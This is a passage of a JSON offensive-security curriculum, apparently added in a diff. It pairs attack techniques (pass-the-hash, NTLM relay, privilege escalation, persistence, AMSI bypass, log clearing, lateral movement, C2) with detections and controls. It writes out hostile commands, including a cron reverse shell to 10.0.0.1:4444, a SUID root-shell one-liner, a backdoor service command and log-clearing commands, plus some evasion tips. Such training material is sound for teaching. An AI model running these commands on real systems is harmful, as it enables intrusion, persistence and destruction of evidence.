+            "logs": ["Windows Event 4624 (Logon Type 3, NTLM — pass the hash)", "Windows Event 4624 (Logon Type 3, Kerberos — pass the ticket)", "Windows Event 4768 (TGT request — overpass the hash)", "Windows Event 4769 (TGS request from unexpected source)"],
+            "detections": ["Sigma: NTLM logon (Event 4624 with NTLM SSP) where Kerberos is normal", "Sigma: anomalous Logon Type 3 from unexpected source hosts", "Sigma: Golden Ticket detection (forged ticket has unusual properties)", "UEBA: unusual lateral movement patterns"],
+            "controls": ["Disable NTLM where possible (LAN Manager authentication level = 5)", "Enable SMB signing", "Restricted Admin Mode for RDP", "Local Admin Password Solution (LAPS)", "Tiered administration"]
+          },
+          "drills": [
+            "Use CrackMapExec/NetExec with pass-the-hash to execute commands across multiple lab Windows hosts",
+            "Extract a Kerberos ticket with Mimikatz and inject it to authenticate to another service (pass the ticket)",
+            "Forge a Golden Ticket using the krbtgt hash and use it to access domain resources"
+          ],
+          "common_mistakes": [
+            "Trying pass the hash over Kerberos — PtH only works with NTLM authentication, not Kerberos",
+            "Forgetting that SMB signing requirements can block pass-the-hash over SMB in hardened environments",
+            "Using Golden Tickets without understanding they are detectable via ticket anomaly analysis"
+          ]
+        },
+        {
+          "id": "ntlm-relay-and-llmnr-poisoning",
+          "title": "NTLM Relay & LLMNR/NBT-NS Poisoning",
+          "concepts": [
+            "LLMNR/NBT-NS poisoning: responding to name resolution broadcasts when DNS fails — capture NTLMv2 hashes",
+            "Tools: Responder (Python), Inveigh (PowerShell/C#) — respond to LLMNR, NBT-NS, mDNS, and WPAD requests",
+            "NTLM relay: forwarding captured NTLM authentication to another service to authenticate as the victim",
+            "Relay targets: SMB (signing disabled), LDAP (for AD object modification), HTTP, MSSQL, RPC",
+            "Tools: ntlmrelayx.py (Impacket), Coercer (for forcing authentication), PetitPotam (CVE-2021-36942)"
+          ],
+          "key_facts": [
+            "LLMNR (Link-Local Multicast Name Resolution) uses multicast address 224.0.0.252 UDP 5355 — Windows fallback when DNS fails",
+            "Responder captures NTLMv2 hashes when victims try to resolve non-existent hostnames — crack with hashcat -m 5600",
+            "SMB signing must be disabled on the relay target for NTLM relay over SMB to work",
+            "PetitPotam (CVE-2021-36942) forces a domain controller to authenticate to an attacker-controlled host — relay to AD CS for DC compromise",
+            "mitm6 attacks IPv6 by responding to DHCPv6 requests — Windows prefers IPv6 over IPv4"
+          ],
+          "attack_techniques": ["T1557", "T1557.001", "T1550.002"],
+          "killchain_stage": "credential-access",
+          "defense_pairing": {
+            "what_blue_sees": "LLMNR/NBT-NS poisoning generates anomalous responses to broadcast queries. NTLM relay generates unexpected authentication events on relay targets. Blue team sees: LLMNR/NBT-NS broadcast traffic spikes, multiple machines authenticating to a single host, and LDAP modification events (if relayed to LDAP).",
+            "logs": ["Windows Event 4624 (network logon — NTLM relay)", "Windows Event 4776 (NTLM authentication — captured hash attempts)", "Network traffic logs (LLMNR/NBT-NS broadcast patterns)", "Windows Event 4662 (LDAP modification via relay)"],
+            "detections": ["Sigma: anomalous LLMNR/NBT-NS traffic volume", "Sigma: multiple machines authenticating to a single host via NTLM", "Network IDS: Responder/ntlmrelayx signatures", "Sigma: unexpected LDAP modifications from relay attacks"],
+            "controls": ["Disable LLMNR and NBT-NS via Group Policy", "Enable SMB signing on all systems", "Enable LDAP signing/channel binding", "Disable WPAD", "Block IPv6 on networks not using it", "AD CS hardening (CVE-2021-36942 patch)"]
+          },
+          "drills": [
+            "Run Responder in a lab to capture NTLMv2 hashes from LLMNR/NBT-NS poisoning, then crack them with hashcat",
+            "Use ntlmrelayx.py to relay captured authentication to a target with SMB signing disabled",
+            "Perform a PetitPotam -> NTLM relay to AD CS attack chain to compromise a domain controller"
+          ],
+          "common_mistakes": [
+            "Running Responder AND ntlmrelayx simultaneously without disabling Responder's SMB/HTTP servers — they conflict",
+            "Not checking if SMB signing is enabled on relay targets — relay will fail silently",
+            "Forgetting that modern Windows has SMB signing enabled by default (since Windows 10/Server 2016)"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "privilege-escalation",
+      "title": "Privilege Escalation",
+      "difficulty": "intermediate",
+      "prerequisites": ["exploitation-fundamentals", "active-directory-and-credentials"],
+      "objective": "Escalate privileges on compromised Linux and Windows systems through misconfiguration exploitation, kernel exploits, and abuse of access control weaknesses.",
+      "topics": [
+        {
+          "id": "linux-privilege-escalation",
+          "title": "Linux Privilege Escalation",
+          "concepts": [
+            "SUID/SGID binaries: executables that run with owner/group privileges — find with: find / -perm -4000 2>/dev/null",
+            "Sudo misconfigurations: sudo -l to list allowed commands, abuse via GTFOBins entries",
+            "Linux capabilities: cap_setuid, cap_dac_override — finer-grained than SUID, enumerate with getcap -r / 2>/dev/null",
+            "Cron job exploitation: writable scripts executed as root, PATH hijacking in cron jobs",
+            "Kernel exploits: Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), OverlayFS (CVE-2021-3493)",
+            "Enumeration tools: LinPEAS, LinEnum, linux-smart-enumeration (lse), linux exploit suggester"
+          ],
+          "key_facts": [
+            "GTFOBins (gtfobins.org) is the definitive reference for exploiting SUID/sudo/capability misconfigurations",
+            "SUID binary like /usr/bin/find with SUID: find . -exec /bin/sh -p \\; gives root shell",
+            "Dirty Pipe (CVE-2022-0847) affects Linux kernels 5.8+ through 5.16.10 — allows overwriting read-only files",
+            "sudo -l showing NOPASSWD entries means commands can be run as root without password",
+            "PATH variable hijacking: if a cron job calls a script without full path, place a malicious script earlier in PATH"
+          ],
+          "attack_techniques": ["T1068", "T1548.001", "T1078.003"],
+          "killchain_stage": "privilege-escalation",
+          "defense_pairing": {
+            "what_blue_sees": "Linux privilege escalation appears as sudden UID/GID changes (0=root), execution of SUID binaries by non-root users, sudo abuse patterns, and kernel exploit signatures. Blue team sees: UID change events in audit logs, unusual sudo command execution, and kernel exploit indicators (Dirty Pipe, Dirty COW).",
+            "logs": ["/var/log/auth.log or /var/log/secure (sudo, su commands)", "Linux auditd logs (uid/gid changes, syscall events)", "/var/log/cron (cron job execution)", "process accounting logs"],
+            "detections": ["auditd: anomalous UID transitions (non-root to root)", "auditd: SUID binary execution monitoring", "Sigma: kernel exploit signatures", "Behavioral: unusual sudo command patterns"],
+            "controls": ["Minimal SUID binaries (remove unnecessary ones)", "Proper sudo configuration (specific commands, not ALL)", "Kernel patching", "SELinux/AppArmor", "File integrity monitoring (AIDE, Tripwire)"]
+          },
+          "drills": [
+            "Run LinPEAS on a vulnerable Linux lab machine and identify at least 3 privilege escalation vectors",
+            "Exploit an SUID find binary to escalate to root: find . -exec /bin/sh -p \\;",
+            "Abuse a sudo misconfiguration (e.g., sudo vi -> :!sh) identified via sudo -l to get root"
+          ],
+          "common_mistakes": [
+            "Running automated enumeration without understanding the findings — always manually verify",
+            "Ignoring GTFOBins — it lists hundreds of binary exploitation techniques for SUID/sudo/capability abuse",
+            "Not checking the kernel version — kernel exploits are high-impact but can crash the system"
+          ]
+        },
+        {
+          "id": "windows-privilege-escalation",
+          "title": "Windows Privilege Escalation",
+          "concepts": [
+            "Service exploitation: unquoted service paths, weak service permissions (modify binPath), DLL hijacking",
+            "Registry exploitation: AlwaysInstallElevated, autorun entries, stored credentials in registry",
+            "Token impersonation: SeImpersonatePrivilege abuse via JuicyPotato/PrintSpoofer/GodPotato/RoguePotato",
+            "UAC bypass: auto-elevate exploits, fodhelper, eventvwr, computerdefaults (T1548.002)",
+            "Enumeration tools: WinPEAS, PowerUp, PrivescCheck, Seatbelt, BeRoot"
+          ],
+          "key_facts": [
+            "SeImpersonatePrivilege (held by IIS, SQL Service, WinRM service accounts) enables Potato attacks for SYSTEM",
+            "Unquoted service path: if service path is C:\\Program Files\\My Service\\service.exe and 'Program.exe' exists, it executes instead",
+            "AlwaysInstallElevated registry key (HKLM/HKCU): if set to 1, any MSI package installs with elevated privileges",
+            "PrintSpoofer exploits SeImpersonatePrivilege via named pipe impersonation to get SYSTEM",
+            "UAC bypass via fodhelper: registry key manipulation causes auto-elevated fodhelper.exe to execute attacker command"
+          ],
+          "attack_techniques": ["T1068", "T1548.002", "T1574", "T1574.011"],
+          "killchain_stage": "privilege-escalation",
+          "defense_pairing": {
+            "what_blue_sees": "Windows privilege escalation appears as non-admin processes acquiring SYSTEM/ADMIN privileges, service binary modifications, and registry changes. Blue team sees: Event 4672 (special privileges assigned to new logon), service creation/modification (Event 7045/7036), UAC bypass patterns, and token impersonation indicators.",
+            "logs": ["Windows Event 4672 (special privileges assigned)", "Windows Event 7045 (service installed)", "Windows Event 4688 (new process with elevated privileges)", "Sysmon Event 1 (elevation-related process creation)", "Sysmon Event 13 (registry modification for AlwaysInstallElevated/UAC bypass)"],
+            "detections": ["Sigma: service binary path modification", "Sigma: AlwaysInstallElevated registry changes", "Sigma: UAC bypass fodhelper/eventvwr patterns", "EDR: token impersonation detection (SeImpersonatePrivilege abuse)"],
+            "controls": ["UAC set to 'Always Notify'", "Service permission hardening", "Disable AlwaysInstallElevated", "Least privilege for service accounts", "Application control (AppLocker/WDAC)"]
+          },
+          "drills": [
+            "Run WinPEAS on a vulnerable Windows lab machine and identify privilege escalation vectors",
+            "Exploit SeImpersonatePrivilege using PrintSpoofer or GodPotato to escalate from IIS service account to SYSTEM",
+            "Perform a UAC bypass using the fodhelper registry technique to get elevated command execution"
+          ],
+          "common_mistakes": [
+            "Not checking current privileges before attempting escalation — may already have sufficient access",
+            "Using Potato exploits on patched systems — PrintSpoofer and newer variants are more reliable than JuicyPotato",
+            "Modifying service binPath without restoring it afterward — this breaks the service and is easily detected"
+          ]
+        },
+        {
+          "id": "misconfigurations-and-unpatched-software",
+          "title": "Exploiting Misconfigurations & Unpatched Software",
+          "concepts": [
+            "Kernel exploits: Windows (MS16-032, MS15-051, CVE-2021-1732), Linux (Dirty COW, Dirty Pipe, eBPF)",
+            "Exploit suggesters: Windows Exploit Suggester (WES), Linux Exploit Suggester (LES), Metasploit suggester",
+            "Common misconfigurations: anonymous FTP, default credentials, open shares, excessive file permissions",
+            "Database exploitation: xp_cmdshell (SQL Server), UDF (MySQL), COPY FROM PROGRAM (PostgreSQL)",
+            "Container escapes: Docker socket exposure, privileged containers, Kubernetes RBAC misconfigurations"
+          ],
+          "key_facts": [
+            "Metasploit 'post/multi/recon/local_exploit_suggester' module checks for applicable kernel exploits",
+            "xp_cmdshell in SQL Server (disabled by default since 2005) executes OS commands when re-enabled",
+            "Docker socket at /var/run/docker.sock gives full host access if mounted into a container",
+            "Privileged containers (--privileged) can access host devices, kernel modules, and escape isolation",
+            "Always check for available patches — CVEs are often publicly known before exploitation"
+          ],
+          "attack_techniques": ["T1068", "T1210", "T1611"],
+          "killchain_stage": "privilege-escalation",
+          "defense_pairing": {
+            "what_blue_sees": "Kernel exploits generate anomalous system calls, memory access patterns, and potential system instability. Blue team sees: kernel-level alerts, system crashes (BSOD/panic), container escape indicators, and database anomalous command execution.",
+            "logs": ["Windows Event 4688 (exploit tool execution)", "System event logs (BSOD, kernel panics)", "Database query logs (xp_cmdshell, UDF execution)", "Container runtime logs (Docker daemon access)", "auditd (container escape syscalls)"],
+            "detections": ["EDR: kernel exploit signatures", "Sigma: xp_cmdshell re-enabling", "Container runtime security alerts (Falco, Sysdig)", "Behavioral: container accessing host resources"],
+            "controls": ["Patch management (kernel updates)", "Principle of least privilege", "Container security policies (non-privileged, read-only root)", "Database hardening (disable xp_cmdshell)", "Falco/container runtime security"]
+          },
+          "drills": [
+            "Use Metasploit local_exploit_suggester on a lab Windows target and exploit a kernel vulnerability",
+            "Exploit a Docker socket exposure to escape a container and gain host root access",
+            "Re-enable and exploit xp_cmdshell in a SQL Server to execute OS commands"
+          ],
+          "common_mistakes": [
+            "Running kernel exploits on production systems without testing — they can crash the system",
+            "Not checking if patches are available — a patched kernel makes the exploit useless",
+            "Ignoring container escape techniques in cloud-native environments"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "persistence-and-defense-evasion",
+      "title": "Persistence & Defense Evasion",
+      "difficulty": "advanced",
+      "prerequisites": ["privilege-escalation", "active-directory-and-credentials"],
+      "objective": "Establish persistent access and evade detection using Windows/Linux persistence mechanisms, process injection, living-off-the-land techniques, AMSI/ETW bypasses, and log tampering.",
+      "topics": [
+        {
+          "id": "windows-persistence",
+          "title": "Windows Persistence Mechanisms",
+          "concepts": [
+            "Registry Run Keys (T1547.001): HKLM/HKCU\\...\\CurrentVersion\\Run, RunOnce — execute on logon",
+            "Scheduled Tasks (T1053.005): schtasks /create — execute at specific times or events",
+            "Windows Services (T1543.002): sc create — run as a background service that auto-starts",
+            "WMI Event Subscriptions (T1546.003): __EventFilter + __EventConsumer — trigger on system events",
+            "DLL Search Order Hijacking (T1574.001): placing malicious DLL earlier in search path",
+            "COM Object hijacking (T1546.015): hijacking legitimate COM object references in registry"
+          ],
+          "key_facts": [
+            "Registry Run Keys: HKLM affects all users, HKCU affects current user — persistence survives reboot",
+            "WMI Event Subscriptions are stealthy — no visible scheduled task, executed by WMI service (wmiprvse.exe)",
+            "Autoruns (Sysinternals) shows 50+ autostart locations — essential for finding persistence on endpoints",
+            "Scheduled tasks can trigger on events: /SC ONEVENT /EC System — executes when a system event occurs",
+            "Services are the most common persistence: sc create backdoor binpath= \"C:\\backdoor.exe\" start= auto"
+          ],
+          "attack_techniques": ["T1547.001", "T1053.005", "T1543.002", "T1546.003", "T1574.001", "T1136", "T1098"],
+          "killchain_stage": "persistence",
+          "defense_pairing": {
+            "what_blue_sees": "Persistence mechanisms create registry changes, new services, scheduled tasks, and WMI subscriptions. Blue team sees: registry modifications in autorun locations (Sysmon Event 13), new service creation (Event 7045), new scheduled tasks (Event 4698), and WMI subscription creation.",
+            "logs": ["Windows Event 7045 (service installed)", "Windows Event 4698 (scheduled task created)", "Sysmon Event 13 (registry value set in Run key)", "Sysmon Event 1 (WMI provider host executing suspicious commands)", "Windows Event 4662 (WMI namespace modification)"],
+            "detections": ["Sigma: service creation by non-standard process", "Sigma: Run Key modification", "Sigma: scheduled task creation", "Sysmon configuration for registry monitoring", "Autoruns baseline comparison"],
+            "controls": ["Application control (AppLocker/WDAC)", "Privilege management (least privilege)", "Sysmon for persistence monitoring", "Group Policy restrictions", "EDR with persistence detection"]
+          },
+          "drills": [
+            "Establish persistence using 5 different methods on a lab Windows machine (Run key, scheduled task, service, WMI, DLL hijacking)",
+            "Use Sysinternals Autoruns to identify all persistence mechanisms you created",
+            "Configure Sysmon with SwiftOnSecurity config to detect persistence mechanisms"
+          ],
+          "common_mistakes": [
+            "Using HKLM Run Keys when you do not have admin privileges — use HKCU instead",
+            "Not cleaning up persistence mechanisms after an engagement — creates permanent backdoors",
+            "Creating obvious service names or scheduled task names that defenders will immediately flag"
+          ]
+        },
+        {
+          "id": "linux-persistence",
+          "title": "Linux Persistence Mechanisms",
+          "concepts": [
+            "Cron jobs: add reverse shell to crontab — execute on schedule",
+            "Systemd services: create a malicious .service file in /etc/systemd/system/",
+            "SSH authorized_keys: add attacker's public key to ~/.ssh/authorized_keys for persistent SSH access",
+            "PAM (Pluggable Authentication Modules): backdoor authentication module that logs credentials or allows hidden access",
+            "Bash profile injection: add malicious commands to ~/.bashrc, /etc/profile, or /etc/bash.bashrc",
+            "LD_PRELOAD: inject malicious shared library into all dynamically-linked processes"
+          ],
+          "key_facts": [
+            "SSH authorized_keys persistence is stealthy — appears as normal SSH login with valid key authentication",
+            "Systemd services start automatically on boot and are harder to detect than cron jobs",
+            "PAM backdoor via pam_unix.so modification can log all passwords or create hidden backdoor accounts",
+            "LD_PRELOAD in /etc/ld.so.preload injects a shared library into every dynamic executable",
+            "Cron persistence: echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"' | crontab -"
+          ],
+          "attack_techniques": ["T1053.003", "T1543.002", "T1098", "T1574.006", "T1037.004"],
+          "killchain_stage": "persistence",
+          "defense_pairing": {
+            "what_blue_sees": "Linux persistence mechanisms create new cron entries, systemd services, SSH keys, and modified system files. Blue team sees: new cron jobs (/var/log/cron), new systemd services (journalctl), SSH key additions, and file integrity changes in critical paths.",
+            "logs": ["/var/log/cron (cron job execution)", "systemd journal logs (service start/stop)", "/var/log/auth.log (SSH logins)", "auditd (file modifications in system directories)", "File integrity monitoring alerts"],
+            "detections": ["auditd: file modifications in /etc/cron*, /etc/systemd, ~/.ssh/", "FIM (File Integrity Monitoring): AIDE/Tripwire alerts", "Behavioral: unexpected systemd service activation", "Sigma: SSH authorized_keys file modifications"],
+            "controls": ["File Integrity Monitoring (AIDE, Tripwire)", "SELinux/AppArmor mandatory access control", "SSH hardening (key-only auth, no root login)", "Cron/systemd access restrictions", "auditd for system file monitoring"]
+          },
+          "drills": [
+            "Establish persistence on a lab Linux machine using systemd service, cron job, and SSH authorized_keys",
+            "Implement a PAM backdoor that logs all authentication attempts to a hidden file",
+            "Configure auditd and AIDE to detect the persistence mechanisms you deployed"
+          ],
+          "common_mistakes": [
+            "Adding SSH keys to root's authorized_keys — this is immediately suspicious and heavily monitored",
+            "Not checking if SELinux/AppArmor will block the persistence mechanism",
+            "Creating cron jobs with obvious reverse shell commands that are easily detected in process lists"
+          ]
+        },
+        {
+          "id": "process-injection-and-defense-evasion",
+          "title": "Process Injection & Defense Evasion",
+          "concepts": [
+            "Process injection (T1055): VirtualAllocEx + WriteProcessMemory + CreateRemoteThread in target process",
+            "Process hollowing: suspend legitimate process, replace its image with malicious code, resume",
+            "Living Off the Land (LOTL): using legitimate system tools (PowerShell, WMI, certutil, mshta) for malicious actions",
+            "AMSI bypass: patching AMSI in memory (amsi.dll AmsiScanBuffer) to disable script content scanning",
+            "ETW bypass: patching EtwEventWrite in ntdll.dll to disable Event Tracing for Windows logging",
+            "Masquerading (T1036): renaming executables, matching legitimate process names, using signed binaries"
+          ],
+          "key_facts": [
+            "CreateRemoteThread (T1055.001) injects code into another process — detectable via Sysmon Event 8",
+            "Process hollowing creates a legitimate process in suspended state, unmaps its memory, injects malicious code, and resumes",
+            "Living Off the Land Binaries (LOLBAS project) lists 200+ legitimate Windows executables that can execute code",
+            "AMSI bypass: patch AmsiScanBuffer function to return AMSI_RESULT_CLEAN — prevents script content scanning",
+            "Common LOTL tools: certutil (download), mshta (execute HTA), rundll32 (execute DLL), regsvr32 (execute COM), msiexec (install MSI)"
+          ],
+          "attack_techniques": ["T1055", "T1055.001", "T1055.012", "T1218", "T1036", "T1027", "T1140", "T1202"],
+          "killchain_stage": "defense-evasion",
+          "defense_pairing": {
+            "what_blue_sees": "Process injection generates CreateRemoteThread events, suspicious memory allocation patterns, and parent-child process anomalies. LOTL techniques appear as legitimate tools executing with unusual parameters. AMSI/ETW bypass creates memory patch events. Blue team sees: Sysmon Event 8 (CreateRemoteThread), Event 7 (suspicious DLL loading), and anomalous LOTL command lines.",
+            "logs": ["Sysmon Event 8 (CreateRemoteThread — process injection)", "Sysmon Event 7 (image loaded — suspicious DLLs)", "Sysmon Event 1 (process creation — LOTL with suspicious args)", "Sysmon Event 10 (process access — LSASS access)", "PowerShell ScriptBlock logging (Event 4104)"],
+            "detections": ["Sigma: CreateRemoteThread from suspicious source process", "Sigma: certutil/mshta/rundll32 with download/execution arguments", "EDR: memory scanning for injected code", "Sigma: AMSI bypass patterns in PowerShell logs", "Sigma: parent-child process anomalies"],
+            "controls": ["EDR with injection detection", "AMSI (Anti-Malware Scan Interface)", "ETW (Event Tracing for Windows)", "Application control (AppLocker/WDAC)", "PowerShell Constrained Language Mode", "Sysmon with process injection monitoring"]
+          },
+          "drills": [
+            "Perform process hollowing on a lab Windows machine using a tool like ProcessHacker or custom C# code",
+            "Use LOLBAS techniques to download and execute a payload using certutil, mshta, and rundll32",
+            "Implement an AMSI bypass and verify that PowerShell script scanning is disabled"
+          ],
+          "common_mistakes": [
+            "Using CreateRemoteThread (the most detected injection technique) — consider early bird APC injection or thread hijacking instead",
+            "Forgetting that AMSI bypass is temporary — it only affects the current process/session",
+            "Using LOTL tools with default/obvious command-line arguments that EDR immediately flags"
+          ]
+        },
+        {
+          "id": "log-tampering-and-indicator-removal",
+          "title": "Log Tampering & Indicator Removal",
+          "concepts": [
+            "Clearing Windows Event Logs (T1070.001): wevtutil cl System — clears entire event log",
+            "Clearing Linux logs: rm /var/log/auth.log, shred, or overwriting with null bytes",
+            "Timestomping (T1070.006): modifying file timestamps to hide when files were created/modified",
+            "Deleting dropped tools and payloads: removing evidence of post-exploitation activity",
+            "Clearing command history: unset HISTFILE, history -c, rm ~/.bash_history",
+            "Network trace removal: clearing proxy logs, firewall logs, DNS cache"
+          ],
+          "key_facts": [
+            "wevtutil cl Security clears the Windows Security log — this itself generates no event because the log is being cleared",
+            "Event 1102 (audit log cleared) is logged in the Security log BEFORE clearing — attackers must also clear this event",
+            "Timestomping modifies MACE timestamps (Modified, Accessed, Changed, Entry) in NTFS $MFT",
+            "HISTFILE deletion only prevents future history logging in the current session — existing sessions are unaffected",
+            "Proper OPSEC: delete logs selectively rather than clearing entire logs — full log clears are huge red flags"
+          ],
+          "attack_techniques": ["T1070", "T1070.001", "T1070.002", "T1070.004", "T1070.006", "T1564.002"],
+          "killchain_stage": "defense-evasion",
+          "defense_pairing": {
+            "what_blue_sees": "Log clearing is one of the most suspicious activities a defender can observe. Blue team sees: Windows Event 1102 (audit log cleared), gaps in log continuity, sudden cessation of all events from a host, and timestomping anomalies (MACB timestamp inconsistencies).",
+            "logs": ["Windows Event 1102 (audit log cleared — fired BEFORE clearing completes)", "Sysmon Event 1 (wevtutil execution)", "File integrity monitoring alerts (log file deletion)", "SIEM: log gap detection (hosts going dark)"],
+            "detections": ["Sigma: Event 1102 (audit log cleared)", "Sigma: wevtutil execution", "SIEM: log ingestion gaps and host silence detection", "USN Journal analysis for deleted files", "$MFT analysis for timestomping"],
+            "controls": ["Centralized log forwarding (WEC/SIEM) — attacker cannot delete remote logs", "Log immutability (write-once storage)", "File integrity monitoring (AIDE, Tripwire)", "Event 1102 alerting", "Backup log retention"]
+          },
+          "drills": [
+            "Clear Windows Security log using wevtutil cl Security on a lab machine and verify Event 1102 is generated",
+            "Use timestomping to modify a file's timestamps and detect the anomaly with forensic tools",
+            "Implement centralized log forwarding (Windows Event Forwarding) to a remote collector that an attacker on the endpoint cannot clear"
+          ],
+          "common_mistakes": [
+            "Clearing entire event logs — this is the loudest possible action and triggers immediate alerts",
+            "Forgetting that Event 1102 is generated BEFORE the log clears — the clearing action itself is logged",
+            "Not accounting for centralized log forwarding — local clearing is useless if logs are forwarded in real-time"
+          ]
+        },
+        {
+          "id": "advanced-defense-evasion",
+          "title": "Advanced Evasion: Obfuscation, Signing & Anti-Analysis",
+          "concepts": [
+            "Code obfuscation: Invoke-Obfuscation for PowerShell, ConfuserEx for .NET, custom packers",
+            "EDR bypass techniques: direct syscalls (SysWhispers), unhooking ntdll.dll, hardware breakpoints",
+            "Code signing abuse: stolen or compromised code signing certificates to sign malicious binaries",
+            "Sandbox evasion: checking for VM artifacts, delaying execution, checking user interaction",
+            "Encrypted payloads: encrypting shellcode with AES/RC4 and decrypting only in memory at runtime",
+            "In-memory execution: reflective DLL loading, .NET assembly loading (Assembly.Load) without touching disk"
+          ],
+          "key_facts": [
+            "Direct syscalls bypass EDR user-mode hooks by calling the syscall instruction directly instead of going through ntdll.dll",
+            "SysWhispers generates C/C++ headers for direct syscalls — evades EDR hooks on functions like NtAllocateVirtualMemory",
+            "AMSI and ETW are the primary Windows security telemetry sources — both can be patched in-memory",
+            "Cobalt Strike sleep mask encrypts the beacon in memory during sleep to evade memory scanning",
+            "Invoke-Obfuscation provides multiple obfuscation techniques for PowerShell: encoding, string manipulation, type renaming"
+          ],
+          "attack_techniques": ["T1027", "T1027.002", "T1027.009", "T1027.010", "T1036", "T1620", "T1140"],
+          "killchain_stage": "defense-evasion",
+          "defense_pairing": {
+            "what_blue_sees": "Advanced evasion techniques are designed to be invisible — detection requires sophisticated telemetry. Blue team looks for: unhooked ntdll functions (memory integrity), direct syscall patterns, in-memory assembly execution without disk artifacts, and behavioral anomalies that signature-based detection misses.",
+            "logs": ["ETW telemetry (if not bypassed): .NET assembly load events, DLL load events", "Sysmon Event 7 (module load — suspicious DLLs)", "Sysmon Event 8 (remote thread creation)", "Memory scanning results (if EDR supports it)", "PowerShell ScriptBlock logging (Event 4104)"],
+            "detections": ["EDR: ntdll memory integrity checks (unhooking detection)", "EDR: memory scanning for injected/encrypted payloads", "ETW: .NET Assembly.Load from suspicious sources", "Sigma: obfuscated PowerShell patterns", "Behavioral: direct syscall detection"],
+            "controls": ["EDR with kernel-level telemetry and memory scanning", "AMSI + ETW with integrity protection", "PowerShell Constrained Language Mode", "Application control (WDAC with code integrity)", "Network-based detection (cannot evade network signatures)"]
+          },
+          "drills": [
+            "Use SysWhispers to generate direct syscalls for a shellcode injector and compare detection with/without hooks",
+            "Obfuscate a PowerShell script using Invoke-Obfuscation and test against AMSI and ScriptBlock logging",
+            "Load a .NET assembly (e.g., Rubeus) entirely in memory using Assembly.Load and verify no disk artifacts"
+          ],
+          "common_mistakes": [
+            "Believing obfuscation alone bypasses modern EDR — behavioral detection catches obfuscated payloads",
+            "Forgetting that network-based detection is independent of endpoint evasion — C2 traffic is still visible",
+            "Using well-known evasion tools (SysWhispers, Cobalt Strike) that have their own signatures"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "lateral-movement-and-c2",
+      "title": "Lateral Movement, C2 & Collection",
+      "difficulty": "advanced",
+      "prerequisites": ["persistence-and-defense-evasion", "active-directory-and-credentials"],
+      "objective": "Move laterally through networks using SMB, WMI, WinRM, and RDP; establish covert command and control channels; and collect and stage data for exfiltration.",
+      "topics": [
+        {
+          "id": "lateral-movement-techniques",
+          "title": "Lateral Movement Techniques",
+          "concepts": [
+            "SMB/Windows Admin Shares (T1021.002): C$, ADMIN$, IPC$ shares for file transfer and remote execution",
+            "PsExec (Sysinternals): copies service binary to ADMIN$ and creates/starts a remote service over SMB",
+            "WMI (T1021.006): wmic /node:TARGET process call create — remote process creation via DCOM/WMI",
+            "WinRM (T1021.006): Enter-PSSession, Invoke-Command — PowerShell remoting on port 5985 (HTTP) / 5986 (HTTPS)",
+            "RDP (T1021.001): Remote Desktop Protocol on port 3389 — graphical remote access",
+            "Pass-the-Hash lateral movement: CrackMapExec/NetExec, Impacket's psexec.py/wmiexec.py with hashes",
+            "DCOM lateral movement: MMC20.Application, ShellWindows, ShellBrowserWindow — DCOM-based remote execution"
+          ],
+          "key_facts": [
+            "Windows Admin Shares: C$ (C: drive), ADMIN$ (Windows directory), IPC$ (named pipes) — accessible with admin credentials",
+            "PsExec copies a service executable to ADMIN$ share, creates a temporary service, executes it, and cleans up",
+            "WMI remote execution: wmic /node:192.168.1.10 /user:admin process call create 'cmd.exe /c whoami'",
+            "WinRM uses port 5985 (HTTP) or 5986 (HTTPS) — enabled by default on Server 2012+ but must be configured",
+            "CrackMapExec/NetExec: nxc smb 192.168.1.0/24 -u admin -H <hash> -x 'whoami' — mass lateral movement"
+          ],
+          "attack_techniques": ["T1021", "T1021.001", "T1021.002", "T1021.006", "T1570", "T1550.002"],
+          "killchain_stage": "lateral-movement",
+          "defense_pairing": {
+            "what_blue_sees": "Lateral movement generates network connections between workstations (unusual in normal operations), remote service creation, and new logon sessions on multiple hosts. Blue team sees: Event 4624 (Logon Type 3 from lateral movement tools), Event 7045 (new service from PsExec), Event 4688 (remote process creation), and unusual host-to-host connections.",
+            "logs": ["Windows Event 4624 (Logon Type 3 — network logon)", "Windows Event 7045 (service created — PsExec)", "Windows Event 4688 (remote process creation)", "Sysmon Event 3 (network connections between hosts)", "Sysmon Event 1 (PsExec service process creation)"],
+            "detections": ["Sigma: Event 4624 Logon Type 3 from unexpected source hosts", "Sigma: service creation via PsExec (PSEXESVC)", "Sigma: WMI remote process creation patterns", "Network: anomalous host-to-host SMB/WMI/WinRM connections", "UEBA: unusual lateral movement patterns"],
+            "controls": ["SMB signing requirements", "WinRM restricted to jump servers", "LAPS (unique local admin passwords)", "Network segmentation (East-West traffic monitoring)", "Privileged Access Workstations (PAW)", "Tiered administration model"]
+          },
+          "drills": [
+            "Use PsExec to move laterally to another lab Windows host and execute commands remotely",
+            "Use Impacket's wmiexec.py for passwordless lateral movement with pass-the-hash",
+            "Use CrackMapExec/NetExec to identify which hosts in a subnet have a specific credential valid"
+          ],
+          "common_mistakes": [
+            "Using PsExec without understanding it creates a service and generates Event 7045 — very noisy",
+            "Not verifying credentials are valid on the target before attempting lateral movement — failed logons trigger alerts",
+            "Moving between hosts in a non-systematic way — random lateral movement creates an obvious trail"
+          ]
+        },
+        {
+          "id": "command-and-control-frameworks",
+          "title": "Command & Control Frameworks",
+          "concepts": [
+            "Cobalt Strike: commercial C2 framework with Team Server, Beacon (implant), Malleable C2 profiles, and Aggressor Scripts",
+            "Sliver: open-source C2 framework with implants (Go-based), supports mutual TLS, WireGuard, and HTTP(S)",
+            "Mythic: modular C2 framework with pluggable agents and C2 profiles — separates UI, API, and agents",
+            "Havoc: open-source C2 with modern UI, supports sleep mask and indirect syscalls",
+            "C2 communication methods: HTTP(S) beacons, DNS tunneling, SMB named pipes, TCP listeners",
+            "Malleable C2 profiles: customize beacon traffic to blend with legitimate web traffic"
+          ],
+          "key_facts": [
+            "Cobalt Strike Beacon is the most widely used (and detected) C2 implant — Malleable C2 profiles customize its network signatures",
+            "Sliver implants are compiled Go binaries — larger file size but harder to detect than Cobalt Strike",
+            "DNS C2 tunneling: beaconing via DNS queries to attacker-controlled domain — bypasses egress firewall rules",
+            "SMB named pipe C2: beacons communicate through SMB named pipes for air-gapped pivot communication",
+            "Cobalt Strike sleep mask: encrypts beacon memory during sleep period to evade memory scanning"
+          ],
